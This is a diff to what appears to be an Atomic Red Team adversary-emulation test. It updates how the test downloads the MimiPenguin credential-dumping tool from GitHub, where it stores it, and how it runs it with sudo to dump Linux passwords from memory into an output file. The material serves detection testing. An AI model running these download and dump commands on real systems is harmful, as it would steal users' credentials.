@@ -166,17 +166,17 @@ atomic_tests:
     MimiPenguin_Location:
       description: Path of MimiPenguin script
       type: path
-      default: /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh
-  dependency_executor_name: sh
+      default: PathToAtomicsFolder/../ExternalPayloads/mimipenguin/mimipenguin.sh
   dependencies:
   - description: |
       MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})
     prereq_command: |
       if [ -f "#{MimiPenguin_Location}" ]; then exit 0; else exit 1; fi;
     get_prereq_command: |
-      wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
-      mkdir /tmp/mimipenguin
-      tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
+      payload_dir=$(dirname "#{MimiPenguin_Location}")
+      mkdir -p "$payload_dir"
+      wget -O "$payload_dir/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+      tar -xzf "$payload_dir/mimipenguin.tar.gz" --strip-components=1 -C "$payload_dir"
   - description: |
       Strings must be installed
     prereq_command: |
@@ -188,18 +188,19 @@ atomic_tests:
     prereq_command: |
       if [ -x "$(command -v python2 --version)" ]; then exit 0; else exit 1; fi;
     get_prereq_command: |
-      sudo apt-get -y install python2       
+      sudo apt-get -y install python2
   - description: |
       Libc-bin must be installed
     prereq_command: |
       if [ -x "$(command -v ldd --version)" ]; then exit 0; else exit 1; fi;
     get_prereq_command: |
-      sudo apt-get -y install libc-bin        
+      sudo apt-get -y install libc-bin
   executor:
     command: |
-      sudo #{MimiPenguin_Location} > #{output_file}
-      cat #{output_file}
+      sudo bash "#{MimiPenguin_Location}" > "#{output_file}"
+      cat "#{output_file}"
     cleanup_command: |
       rm -f #{output_file} > /dev/null
+      rm -rf $(dirname "#{MimiPenguin_Location}")
     name: bash
     elevation_required: true
